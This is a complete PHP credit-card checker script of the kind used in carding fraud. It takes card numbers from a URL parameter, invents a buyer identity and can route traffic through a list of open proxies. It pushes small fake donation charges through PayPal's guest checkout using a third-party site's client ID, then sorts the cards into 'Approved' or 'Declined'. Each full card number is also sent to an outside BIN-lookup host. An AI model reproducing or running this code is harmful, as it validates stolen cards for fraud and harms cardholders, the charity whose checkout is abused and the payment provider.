<?php
error_reporting(0);
require 'vendor/autoload.php'; 
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\FileCookieJar;
use GuzzleHttp\Middleware;
use Psr\Http\Message\RequestInterface;
require_once 'genphone.php';
$areaCode = $areaCodes[array_rand($areaCodes)];
$phone = sprintf("%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));

function generateCookieID() {
    $uniquePrefix = uniqid('', true);
    $cookieID = hash('sha256', $uniquePrefix . mt_rand());
    return $cookieID;
}

$cookieID = generateCookieID();

class GuzzleRequestHandler {
    private $client;
    private $cookieJar;
    private $cookieFile;
    private $proxies;
    private $lastEffectiveUrl;

    public function __construct($cookieID, $proxies = [], $saveCookies = true) {
        // Crear la carpeta de cookies si no existe
        $cookieDir = getcwd() . "/cookies";
        if (!file_exists($cookieDir)) {
            mkdir($cookieDir, 0777, true);
        }

        // Definir el archivo de cookies basado en el ID de la cookie
        $this->cookieFile = "$cookieDir/{$cookieID}.txt";
        $this->cookieJar = new FileCookieJar($this->cookieFile, $saveCookies);

        // Configurar el handler stack para incluir el middleware de redirección
        $stack = \GuzzleHttp\HandlerStack::create();
        
        // Middleware para registrar la última URL efectiva
        $historyMiddleware = Middleware::mapRequest(function (RequestInterface $request) {
            $this->lastEffectiveUrl = (string) $request->getUri();
            return $request;
        });
        $stack->push($historyMiddleware);

        // Configurar el cliente Guzzle con el gestor de cookies y el middleware
        $this->client = new Client([
            'cookies' => $this->cookieJar,
            'verify' => false,
            'allow_redirects' => true,
            'handler' => $stack,
        ]);

        // Configurar los proxies
        $this->proxies = $proxies;
    }

    private function getRandomProxy() {
        if (!empty($this->proxies)) {
            return $this->proxies[array_rand($this->proxies)];
        }
        return null;
    }

    public function performGuzzleRequest($url, $requestType, $headers = [], $postFields = null, $specificOptions = [], $maxAttempts = 5, $useProxy = false, $jsonBody = false) {
    $attempt = 0;
    $success = false;
    $responseContent = null;
    $httpCode = null;

    while (!$success && $attempt < $maxAttempts) {
        $options = [
            'headers' => $headers,
            'http_errors' => false,
            'cookies' => $this->cookieJar,
        ];

        // Si es JSON, utiliza 'json' en lugar de 'form_params'
        if ($requestType === 'POST') {
            if ($jsonBody) {
                $options['json'] = $postFields;  // Enviar el cuerpo como JSON
                $options['headers']['Content-Type'] = 'application/json';
            } else {
                $options['form_params'] = $postFields;
            }
        }

        if ($useProxy) {
            $proxy = $this->getRandomProxy();
            if ($proxy) {
                $options['proxy'] = $proxy;
            }
        }

        $options = array_merge($options, $specificOptions);

        try {
            $response = $this->client->request($requestType, $url, $options);
            $httpCode = $response->getStatusCode();
            $responseContent = $response->getBody()->getContents();

            if ($httpCode >= 200 && $httpCode < 300) {
                $success = true;
            } else {
                $attempt++;
                sleep(1);
            }
        } catch (Exception $e) {
            $attempt++;
            sleep(1);
        }
    }

    return [$responseContent, $httpCode];
}

    public function capture($string, $start, $end) {
        $str = explode($start, $string);
        return isset($str[1]) ? explode($end, $str[1])[0] : null;
    }

    public function cleanUp() {
        if (file_exists($this->cookieFile)) {
            unlink($this->cookieFile);
        }
    }

    public function getCookies() {
        return file_exists($this->cookieFile) ? file_get_contents($this->cookieFile) : '';
    }

    // Método para obtener la última URL efectiva después de una redirección
    public function getLastEffectiveUrl() {
        return $this->lastEffectiveUrl;
    }
}

function multiexplode($delimiters, $string) {
    $ready = str_replace($delimiters, $delimiters[0], $string);
    return explode($delimiters[0], $ready);
}

// Lista de proxies a utilizar
$proxies = [
    'https://190.104.146.244:999',
    'https://140.246.149.224:8888',
    'https://101.255.94.161:8080',
    'https://117.2.28.235:55443',
    'https://27.72.28.32:8008',
    'https://131.196.114.9:6969',
    'https://202.141.233.166:48995',
    'https://47.112.102.20:80',
    'https://13.125.194.158:10040',
    'https://187.190.118.141:999',
    'https://20.47.108.204:8888',
    'https://47.115.6.196:3389',
    'https://101.51.197.149:8080',
    'https://200.85.42.194:999',
    'https://125.162.75.248:8080',
    'https://183.87.158.141:8080',
    'https://118.71.225.130:4001',
    'http://78.36.198.158:80',
    'https://103.52.210.237:80',
    'http://177.234.172.30:3128',
    'https://118.99.103.228:8080',
    'http://202.83.173.114:8080',
    'https://36.65.38.142:8080',
    'http://128.199.202.122:3128',
    'https://47.100.14.22:9006',
    'http://198.199.86.11:3128',
    'https://103.47.238.157:55243',
    'http://182.72.150.242:8080',
    'https://186.101.48.195:83',
    'http://209.97.150.167:8080'
];

// Simulamos que los valores de tarjeta de crédito vienen en una cadena de parámetros GET para dividirlos
$lista = $_GET['lista'] ?? '';
$lista = str_replace(" ", "", $lista);
$separadores = array(",", "|", ":", "'", " ", "~", "»");
$explode = multiexplode($separadores, $lista);

if (count($explode) < 4) {
    die("Error: Se requieren al menos 4 valores.");
}

$cc = $explode[0];
$mes = $explode[1];
$year = $explode[2];
$cvv = $explode[3];

$c1 = substr($cc, 0, 4);
$c2 = substr($cc, 4, 4);
$c3 = substr($cc, 8, 4);
$c4 = substr($cc, 12, 4);

$ccs = "$c1 $c2 $c3 $c4";

// Procesar el año en el formato correcto
function formaryear($year, $metodoy) {
    if ($metodoy == 1) {
        return strlen($year) > 2 ? substr($year, 2, 2) : $year;
    } else if ($metodoy == 0) {
        return strlen($year) == 2 ? "20$year" : $year;
    }
    return $year;
}

function puxar($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

$year = formaryear($year, 0);

// Determinar tipo de tarjeta basado en el primer dígito
$typecard = '';
if (substr($cc, 0, 1) == '4') $typecard = "Visa";
elseif (substr($cc, 0, 1) == '5') $typecard = "MasterCard";
elseif (substr($cc, 0, 1) == '6') $typecard = "Discover";
elseif (substr($cc, 0, 1) == '3') $typecard = "American Express";

// Generar GUID
function generateGUID() {
    return sprintf('%s-%s-%s-%s-%s',
        bin2hex(random_bytes(4)),
        bin2hex(random_bytes(2)),
        bin2hex(random_bytes(2)),
        bin2hex(random_bytes(2)),
        bin2hex(random_bytes(6))
    );
}

$guid = generateGUID();
$muid = generateGUID();
$sid = generateGUID();

$Guzzle = new GuzzleRequestHandler($cookieID, $proxies, false);

// Ejemplo de solicitud a `randomuser.me` sin usar proxy
list($resposta, $httpCode) = $Guzzle->performGuzzleRequest(
    'https://random-data-api.com/api/v2/users',
    'GET',
    [],
    null,
    [],
    5,
    false, // Usar proxy
    false
);

if ($httpCode !== 200) {
    echo "<li>Error al obtener datos de usuario: HTTP $httpCode</li>";
    exit;
}

$country = "US";
$firstname = $Guzzle->capture($resposta, '"first_name":"', '"');
$lastname = $Guzzle->capture($resposta, '"last_name":"', '"');
$street = $Guzzle->capture($resposta, '"street_address":"','"');
$city = $Guzzle->capture($resposta, '"city":"', '"');
$state = $Guzzle->capture($resposta, '"state":"', '"');
$postcode = $Guzzle->capture($resposta, '"zip_code":"','"');
$email = $Guzzle->capture($resposta, '"email":"', '"');
$serve_arr = array("gmail.com","hotmail.com","outlook.com","yahoo.com","aol.com","protonmail.com","mail.com","icloud.com","zoho.com","yandex.com","gmx.com","tutanota.com","disroot.org","riseup.net","elude.in","autistici.org");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = str_replace(".", "", $email);
$email= trim(str_replace("emailcom", $serv_rnd, $email));

// Mapping US states and Canadian provinces/territories to their abbreviations
$stateMap = [
    // Estados de Estados Unidos
    "Alabama" => "AL", "Alaska" => "AK", "Arizona" => "AZ", "Arkansas" => "AR", "California" => "CA", "Colorado" => "CO",
    "Connecticut" => "CT", "Delaware" => "DE", "District of Columbia" => "DC", "Florida" => "FL", "Georgia" => "GA",
    "Hawaii" => "HI", "Idaho" => "ID", "Illinois" => "IL", "Indiana" => "IN", "Iowa" => "IA", "Kansas" => "KS",
    "Kentucky" => "KY", "Louisiana" => "LA", "Maine" => "ME", "Maryland" => "MD", "Massachusetts" => "MA",
    "Michigan" => "MI", "Minnesota" => "MN", "Mississippi" => "MS", "Missouri" => "MO", "Montana" => "MT",
    "Nebraska" => "NE", "Nevada" => "NV", "New Hampshire" => "NH", "New Jersey" => "NJ", "New Mexico" => "NM",
    "New York" => "NY", "North Carolina" => "NC", "North Dakota" => "ND", "Ohio" => "OH", "Oklahoma" => "OK",
    "Oregon" => "OR", "Pennsylvania" => "PA", "Rhode Island" => "RI", "South Carolina" => "SC", "South Dakota" => "SD",
    "Tennessee" => "TN", "Texas" => "TX", "Utah" => "UT", "Vermont" => "VT", "Virginia" => "VA", "Washington" => "WA",
    "West Virginia" => "WV", "Wisconsin" => "WI", "Wyoming" => "WY",

    // Provincias y territorios de Canadá
    "Alberta" => "AB", "British Columbia" => "BC", "Manitoba" => "MB", "New Brunswick" => "NB",
    "Newfoundland and Labrador" => "NL", "Northwest Territories" => "NT", "Nova Scotia" => "NS",
    "Nunavut" => "NU", "Ontario" => "ON", "Prince Edward Island" => "PE", "Quebec" => "QC", "Saskatchewan" => "SK",
    "Yukon" => "YT"
];

$state = $stateMap[$state] ?? "ON";  // Default to "ON" (Ontario) if state not found

date_default_timezone_set('UTC');
$currentDateTime = date('Y-m-d H:i:s');
$timeInMilliseconds = round(microtime(true) * 1000);

$Guzzle = new GuzzleRequestHandler($cookieID, $proxies, true);

list($step_1, $httpCode) = $Guzzle->performGuzzleRequest(
    "https://www.paypal.com/smart/buttons?locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true",
    "GET",
    [
        "accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer" => "https://onehealthworkforceacademies.org/ ",
        "sec-fetch-dest" => "iframe",
        "sec-fetch-mode" => "navigate",
        "sec-fetch-site" => "cross-site",
        "upgrade-insecure-requests" => "1:Var",
        "user-agent" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    ],
    null,
    [],
    5,
    false, 
    false
);

$AccessToken = $Guzzle->capture($step_1, 'facilitatorAccessToken":"','"');
 echo "<li>AccessToken: $AccessToken<li>";

$amount = random_int(5, 15);
$cents = random_int(1, 99);
$price = "$amount.$cents";
echo $amo = json_encode([
     'Price' => $price
 ]);

$postdata = [
    "purchase_units" => [
        [
            "amount" => [
                "currency_code" => "USD",
                "value" => $price
            ],
            "description" => "Donativo único",
            "custom_id" => "Referencia: Donativo único. Acerca del donativo: ",
            "item_list" => [
                "items" => [
                    [
                        "name" => "FDUM",
                        "description" => "FDUM description"
                    ]
                ]
            ]
        ]
    ],
    "intent" => "CAPTURE"
];

list($step_2, $httpCode) = $Guzzle->performGuzzleRequest(
    "https://www.paypal.com/v2/checkout/orders",
    "POST",
    [
        "authority" => "www.paypal.com",
        "Content-Type" => "application/json",
        "authorization" => "Bearer $AccessToken",
        "origin" => "https://www.paypal.com",
        "paypal-partner-attribution-id",
        "prefer" => "return=representation",
        "referer" => "https://www.paypal.com/smart/buttons?locale.lang=en&locale.country=US&style.label=&style.layout=vertical&style.color=gold&style.shape=&style.tagline=false&style.height=40&style.menuPlacement=below&sdkVersion=5.0.344&components.0=buttons&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&clientID=AaMzI8wEP9DHpPG9wtQdkIk1vLp0BxKgm3DM2-9VnJhhojaIMYl5pu9NIR92uf5nUAc7hI29kQ7jEwH_&sdkCorrelationID=0aab5698a8427&storageID=uid_250b1d7213_mti6ndq6ntc&sessionID=uid_dbc1e53ffd_mti6ndq6ntc&buttonSessionID=uid_1c583f9aa0_mti6ndc6ntk&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=MXN&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&experience=&allowBillingPayments=true",
        "user-agent" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ],
    $postdata,
    [],
    5,
    false, // Usar proxy
    true  // Es Json el Postdata
);

$id = $Guzzle->capture($step_2, '"id":"','"');
 echo "<li>id: $id<li>";

$postdata = [
    "query" => "
        mutation payWithCard(
            \$token: String!
            \$card: CardInput!
            \$phoneNumber: String
            \$firstName: String
            \$lastName: String
            \$shippingAddress: AddressInput
            \$billingAddress: AddressInput
            \$email: String
            \$currencyConversionType: CheckoutCurrencyConversionType
            \$installmentTerm: Int
        ) {
            approveGuestPaymentWithCreditCard(
                token: \$token
                card: \$card
                phoneNumber: \$phoneNumber
                firstName: \$firstName
                lastName: \$lastName
                email: \$email
                shippingAddress: \$shippingAddress
                billingAddress: \$billingAddress
                currencyConversionType: \$currencyConversionType
                installmentTerm: \$installmentTerm
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
    ",
    "variables" => [
        "token" => $id,
        "card" => [
            "cardNumber" => $cc,
            "expirationDate" => $mes."/".$year,
            "postalCode" => $postcode,
            "securityCode" => $cvv
        ],
        "phoneNumber" => $phone,
        "firstName" => $firstname,
        "lastName" => $lastname,
        "billingAddress" => [
            "givenName" => $firstname,
            "familyName" => $lastname,
            "line1" => $street,
            "line2" => null,
            "city" => $city,
            "state" => $state,
            "postalCode" => $postcode,
            "country" => "US"
        ],
        "shippingAddress" => [
            "givenName" => $firstname,
            "familyName" => $lastname,
            "line1" => $street,
            "line2" => null,
            "city" => $city,
            "state" => $state,
            "postalCode" => $postcode,
            "country" => "US"
        ],
        "email" => $email,
        "currencyConversionType" => "PAYPAL"
    ],
    "operationName" => null
];

list($step_3, $httpCode) = $Guzzle->performGuzzleRequest(
    "https://www.paypal.com/graphql?fetch_credit_form_submit",
    "POST",
    [
        "authority" => "www.paypal.com",
        "accept" => "*/*",
        "origin" => "https://www.paypal.com",
        "paypal-client-context" => $id,
        "paypal-client-metadata-id" => $id,
        "referer" => "https://www.paypal.com/smart/card-fields?sessionID=uid_58937796db_mtm6nte6ntm&buttonSessionID=uid_93ad78f223_mtm6nte6ntm&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFNekk4d0VQOURIcFBHOXd0UWRrSWsxdkxwMEJ4S2dtM0RNMi05Vm5KaGhvamFJTVlsNXB1OU5JUjkydWY1blVBYzdoSTI5a1E3akV3SF8mY3VycmVuY3k9TVhOJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX21lcXZmdmR0cGh6YmR6ZmlzZXd5d2ZycWNjeXB6cyJ9fQ&disable-card=&token=$id",
        "user-agent" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "x-app-name" => "standardcardfields",
        "x-country" => "US"
    ],
    $postdata,
    [],
    5,
    false, // Usar proxy
    true  // Es Json el Postdata
);

echo $step_3;

$Guzzle->cleanUp();

$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin='.$cc.'');
$retornocard = puxar($step_3, '"code":"','"' , 1);
$messagecard = puxar($step_3, '"message":"','"' , 1);

if(strpos($step_3, 'INVALID_SECURITY_CODE')) {

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Payment Approved - ($'.$price.') </span> ➔ <span class="text-warning">@pladixoficial</span><br>');

}
if(strpos($step_3, 'INVALID_BILLING_ADDRESS')) {

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Payment Approved - ($'.$price.') </span> ➔ <span class="text-warning">@pladixoficial</span><br>');

}
if(strpos($step_3, 'ADD_SHIPPING_ERROR')) {

die('<span class="text-success">Approved</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-success"> Payment Approved - ($'.$price.') </span> ➔ <span class="text-warning">@pladixoficial</span><br>');

}elseif(strpos($step_3, '"class":"ERROR"')) {

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$retornocard.' - '.$messagecard.' - ($'.$price.') </span> ➔ <span class="text-warning">@pladixoficial</span><br>');


}else{

die('<span class="text-danger">Declined</span> ➔ <span class="text-white">'.$lista.' '.$infobin.'</span> ➔ <span class="text-danger"> '.$retornocard.' - '.$messagecard.' </span> ➔ <span class="text-warning">@pladixoficial</span><br>');

}

?>